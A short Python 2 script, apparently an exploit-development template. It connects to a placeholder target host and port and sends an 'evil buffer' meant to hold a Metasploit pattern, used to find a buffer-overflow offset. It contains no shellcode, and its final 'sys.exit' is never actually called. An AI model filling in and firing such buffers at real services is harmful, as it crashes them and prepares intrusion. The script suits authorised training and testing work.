#!/usr/bin/python2
#author: prorat
#twitter: @pr0rat

import socket
import sys

try:
  print("\n[+] Sending evil buffer...")

  #use msf pattern create module to create a predictable pattern of buffer
  buffer = "PREDICTABLE_PATTERN"

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("TARGETIP", PORT))
  s.send(buffer)
  
  s.close()
 
  print("\n[+] Sending buffer of " + str(len(buffer)) + " bytes...")
  print("\n[+] Sending buffer: " + buffer)
  print("\n[+] Done!")
  
except:
  print("\n[+] Could not connect!")
  sys.exit